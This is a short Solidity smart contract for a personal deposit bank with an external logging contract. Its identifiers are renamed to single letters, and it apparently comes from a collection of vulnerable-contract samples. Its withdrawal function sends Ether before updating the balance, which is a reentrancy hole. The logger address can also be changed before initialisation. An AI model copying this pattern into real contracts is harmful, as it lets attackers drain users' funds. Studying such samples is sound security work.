pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public balances;   
   
    uint public Z = 1 ether;
    
    LogFile L = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    
    bool init;
    
    function A(uint _z)
    public
    {
        if(init)revert();
        Z = _z;
    }
    
    function B(address _l)
    public
    {
        if(init)revert();
        L = LogFile(_l);
    }
    
    function C()
    public
    {
        init = true;
    }
    
    function D()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        L.E(msg.sender,msg.value,"X");
    }
    
    function F(uint _y)
    public
    payable
    {
        if(balances[msg.sender]>=Z && balances[msg.sender]>=_y)
        {
             
            if(msg.sender.call.value(_y)())
            {
                balances[msg.sender]-=_y;
                L.E(msg.sender,_y,"Y");
            }
        }
    }
    
    function() 
    public 
    payable
    {
        D();
    }
    
}

contract LogFile
{
    struct Msg
    {
        address A;
        string  B;
        uint C;
        uint  D;
    }
    
    Msg[] public H;
    
    Msg M;
    
    function E(address _a,uint _c,string _b)
    public
    {
        M.A = _a;
        M.D = now;
        M.C = _c;
        M.B = _b;
        H.push(M);
    }
}